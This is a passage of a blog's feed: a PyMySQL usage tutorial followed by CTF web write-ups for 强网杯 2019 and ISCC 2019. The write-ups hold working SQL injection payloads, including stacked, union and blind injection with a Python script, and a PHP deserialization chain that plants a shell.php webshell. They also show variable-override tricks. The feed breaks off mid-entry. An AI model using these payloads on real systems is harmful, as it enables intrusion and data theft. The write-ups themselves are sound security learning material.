    <content type="html"><![CDATA[<h2 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h2><p>这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。<br><a id="more"></a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>pip install mysql-connector</p><p>pip3 install PyMySQL</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"password"</span>,<span class="string">"database"</span>) <span class="comment">#打开数据库连接</span></span><br><span class="line"></span><br><span class="line">cursor=conn.cursor() <span class="comment">#使用 cursor() 方法创建一个游标对象 cursor</span></span><br><span class="line"></span><br><span class="line">cursor.execute(<span class="string">"SELECT VERSION()"</span>) <span class="comment">#使用execute()方法执行SQL查询</span></span><br><span class="line"></span><br><span class="line">data = cursor.fetchone() <span class="comment">#使用fetchone()方法获取单条数据</span></span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line">conn.close() <span class="comment">#关闭数据库连接</span></span><br></pre></td></tr></table></figure><h3 id="数据表更新"><a href="#数据表更新" class="headerlink" title="数据表更新"></a>数据表更新</h3><p>当数据表内容有更新时，必须用commit()方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"password"</span>,<span class="string">"database"</span>)</span><br><span class="line"></span><br><span class="line">cursor=conn.cursor()</span><br><span class="line"></span><br><span class="line">sql = <span class="string">"INSERT INTO table_name (field1,field2) VALUES (value1,value2)"</span></span><br><span class="line"></span><br><span class="line">cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">conn.commit()</span><br><span class="line"></span><br><span class="line">coon.close()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;驱动&quot;&gt;&lt;a href=&quot;#驱动&quot; class=&quot;headerlink&quot; title=&quot;驱动&quot;&gt;&lt;/a&gt;驱动&lt;/h2&gt;&lt;p&gt;这里我使用两种驱动，一个是mysql-connector另一个是PyMySQL，两个的语法都差不多,就说说pymysql吧。&lt;br&gt;
    
    </summary>
    
      <category term="python学习笔记" scheme="http://chenxiyuan.vip/categories/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯web Writeup</title>
    <link href="http://chenxiyuan.vip/2019/05/27/2019%E5%BC%BA%E7%BD%91%E6%9D%AFwebwp/"/>
    <id>http://chenxiyuan.vip/2019/05/27/2019强网杯webwp/</id>
    <published>2019-05-27T08:48:12.000Z</published>
    <updated>2019-05-30T06:19:20.387Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01随便注"><a href="#0x01随便注" class="headerlink" title="0x01随便注"></a>0x01随便注</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> supersqli;</span><br><span class="line"><span class="keyword">USE</span> supersqli;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> (<span class="string">`flag`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`1919810931114514`</span> (<span class="string">`flag`</span>) <span class="keyword">VALUES</span>(<span class="string">'flag&#123;...............&#125;'</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> (<span class="string">`id`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,<span class="string">`data`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`words`</span> (<span class="string">`id`</span>,<span class="string">`data`</span>) <span class="keyword">VALUES</span>(<span class="number">1</span>,<span class="string">'Only red tea'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`words`</span> (<span class="string">`id`</span>,<span class="string">`data`</span>) <span class="keyword">VALUES</span>(<span class="number">2</span>,<span class="string">'I have a big planet'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`words`</span> (<span class="string">`id`</span>,<span class="string">`data`</span>) <span class="keyword">VALUES</span>(<span class="number">114514</span>,<span class="string">'come on baby!'</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><p>这道题从郁师傅那里学到了骚套路。<br>首先发现了waf，过滤的其实还算少。这题可以用堆叠注入查表和字段，整个结构就清晰了。<br><img src="http://i2.tiimg.com/665720/d5d5b6b4d083319e.png" alt="Markdown"><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">';<span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">[0]=&gt;</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">["Tables_in_supersqli"]=&gt;</span></span><br><span class="line"><span class="comment">string(16) "1919810931114514"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">[1]=&gt;</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">["Tables_in_supersqli"]=&gt;</span></span><br><span class="line"><span class="comment">string(5) "words"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(2) &#123;</span></span><br><span class="line"><span class="comment">[0]=&gt;</span></span><br><span class="line"><span class="comment">array(6) &#123;</span></span><br><span class="line"><span class="comment">["Field"]=&gt;</span></span><br><span class="line"><span class="comment">string(2) "id"</span></span><br><span class="line"><span class="comment">["Type"]=&gt;</span></span><br><span class="line"><span class="comment">string(7) "int(11)"</span></span><br><span class="line"><span class="comment">["Null"]=&gt;</span></span><br><span class="line"><span class="comment">string(3) "YES"</span></span><br><span class="line"><span class="comment">["Key"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">["Default"]=&gt;</span></span><br><span class="line"><span class="comment">NULL</span></span><br><span class="line"><span class="comment">["Extra"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">[1]=&gt;</span></span><br><span class="line"><span class="comment">array(6) &#123;</span></span><br><span class="line"><span class="comment">["Field"]=&gt;</span></span><br><span class="line"><span class="comment">string(4) "data"</span></span><br><span class="line"><span class="comment">["Type"]=&gt;</span></span><br><span class="line"><span class="comment">string(4) "text"</span></span><br><span class="line"><span class="comment">["Null"]=&gt;</span></span><br><span class="line"><span class="comment">string(3) "YES"</span></span><br><span class="line"><span class="comment">["Key"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">["Default"]=&gt;</span></span><br><span class="line"><span class="comment">NULL</span></span><br><span class="line"><span class="comment">["Extra"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">';<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(1) &#123;</span></span><br><span class="line"><span class="comment">[0]=&gt;</span></span><br><span class="line"><span class="comment">array(6) &#123;</span></span><br><span class="line"><span class="comment">["Field"]=&gt;</span></span><br><span class="line"><span class="comment">string(4) "flag"</span></span><br><span class="line"><span class="comment">["Type"]=&gt;</span></span><br><span class="line"><span class="comment">string(4) "text"</span></span><br><span class="line"><span class="comment">["Null"]=&gt;</span></span><br><span class="line"><span class="comment">string(3) "YES"</span></span><br><span class="line"><span class="comment">["Key"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">["Default"]=&gt;</span></span><br><span class="line"><span class="comment">NULL</span></span><br><span class="line"><span class="comment">["Extra"]=&gt;</span></span><br><span class="line"><span class="comment">string(0) ""</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p>sql语句也很清楚了，select被过滤了，但查询语句查的是<code>words</code>表，而flag在另一个表中，如何查询呢？<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="string">`data`</span> <span class="keyword">FROM</span> words <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> ;</span><br></pre></td></tr></table></figure></p><p>注意到waf黑名单其实过滤的很少的，比如alter和rename没被过滤就可以加以利用。我们可以把words表名改掉，再把flag所在表名改成words，再利用alter添加id字段，即可成功查询。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:';<span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> wordss;<span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">default</span> <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p>另一种方法是利用自定义变量绕过，学到了学到了。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @sqli=<span class="keyword">concat</span>(<span class="string">'se'</span>,<span class="string">'lect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @sqli;<span class="keyword">EXECUTE</span> stmt1;</span><br></pre></td></tr></table></figure></p><h2 id="0x02-upload"><a href="#0x02-upload" class="headerlink" title="0x02 upload"></a>0x02 upload</h2><p>题目环境 <a href="https://github.com/CTFTraining/qwb_2019_upload" target="_blank" rel="noopener">https://github.com/CTFTraining/qwb_2019_upload</a><br>这道题从高明的黑客那里得到提示，访问<a href="http://www.tar.gz，果然源码泄露。拿到源码很无奈，因为upload那里把文件名MD5以后加上png后缀，我就没思路了。赛后看其他大佬的复现，终于懂了。" target="_blank" rel="noopener">www.tar.gz，果然源码泄露。拿到源码很无奈，因为upload那里把文件名MD5以后加上png后缀，我就没思路了。赛后看其他大佬的复现，终于懂了。</a><br>这道题是利用反序列化，执行我们需要的代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br></pre></td></tr></table></figure></p><p>profile中存在魔术方法get和call，当访问不存在的变量或私有变量时调用<strong>get(),在对象中调用一个不可访问方法或私有方法时调用</strong>call()。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>继续阅读源码，在Register中发现析构函数调用了checker的index()函数，而Profile中不存在，所以我们就可以反序列化传入一个Register对象，Register的checker成员变量是Profile对象，这样就能触发<strong>call和</strong>get方法了。再调用Profile中的upload_img()，通过控制成员变量，可以控制执行copy函数就能成功生成图马。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>首先先上传一个图马，获取到图片地址再利用payload序列化并base64编码再传入cookie访问，成功upload图马。<br>payload如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/.../..."</span>;<span class="comment">//图片路径</span></span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/.../shell.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> Register();</span><br><span class="line">$a-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$a-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01随便注&quot;&gt;&lt;a href=&quot;#0x01随便注&quot; class=&quot;headerlink&quot; title=&quot;0x01随便注&quot;&gt;&lt;/a&gt;0x01随便注&lt;/h2&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;DATABASE&lt;/span&gt; supersqli;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;USE&lt;/span&gt; supersqli;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`1919810931114514`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`flag`&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;VARCHAR&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`1919810931114514`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`flag`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;flag&amp;#123;...............&amp;#125;&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`words`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`id`&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;INT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;`data`&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;VARCHAR&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`words`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`id`&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;`data`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;Only red tea&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`words`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`id`&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;`data`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;I have a big planet&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;INSERT&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;INTO&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;`words`&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;`id`&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;`data`&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;VALUES&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;114514&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;come on baby!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://chenxiyuan.vip/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>iscc2019 web wp</title>
    <link href="http://chenxiyuan.vip/2019/05/22/iscc2019-web-wp/"/>
    <id>http://chenxiyuan.vip/2019/05/22/iscc2019-web-wp/</id>
    <published>2019-05-22T09:31:45.000Z</published>
    <updated>2019-05-22T13:39:00.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>这个涨姿势，chr()函数是模256，在原数加256即可绕过，intval可以用科学计数法绕过，payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=2e5&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313</span><br></pre></td></tr></table></figure></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>这题拿到了一血，因为我一发入魂，直接猜到996，果然ctf需要一点脑洞（联系到之前的996事件）。<br>可以用burp，删除cookie和user_code就能暴力破解过验证码了。</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这题是sql-libs原题，二次注入。</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p> parse_str()把查询字符串解析到变量中,存在变量覆盖，payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</span><br></pre></td></tr></table></figure></p><a id="more"></a><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>首先说我们不是Union.373组织成员，推测是改user-agent，果然，接着又让我们输入用户名和密码，post提交username和password，得到提示组织成员密码即为flag。此题为union盲注，参考下大佬的教程<a href="http://wonderkun.cc/index.html/?p=547" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=547</a><br>先得到username<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; or 1 union select 1,2,3 &amp;password=&apos;1</span><br></pre></td></tr></table></figure></p><p><img src="http://i1.fuimg.com/665720/fbda4c85a750a4d4.png" alt="Markdown"><br>然后改脚本就能爆出flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://39.100.83.188:8054/"</span></span><br><span class="line">username=<span class="string">"union_373_Tom' union distinct select 1,2,0x&#123;&#125; order by 3,'0"</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span>  _  <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">120</span>):</span><br><span class="line">headers=&#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Union.373"</span>&#125;</span><br><span class="line">data =&#123;<span class="string">"username"</span>:username.format((flag+chr(i)).encode(<span class="string">'hex'</span>)),<span class="string">"password"</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">res = requests.post(url,data=data,headers=headers)</span><br><span class="line">res.encoding=<span class="string">'utf-8'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"union_373_Tom"</span>  <span class="keyword">in</span> res.text:</span><br><span class="line">flag= flag+chr(i<span class="number">-1</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">'__main__'</span>:</span><br><span class="line">    getPassword()</span><br></pre></td></tr></table></figure></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>第一次遇到这种jwt题，参考教程<a href="https://zhuanlan.zhihu.com/p/37305980" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/37305980</a><br>首先看到Sources里commom.js，我的用户名是chenxiyuan<br><figure class="highlight js"><table><tr><td 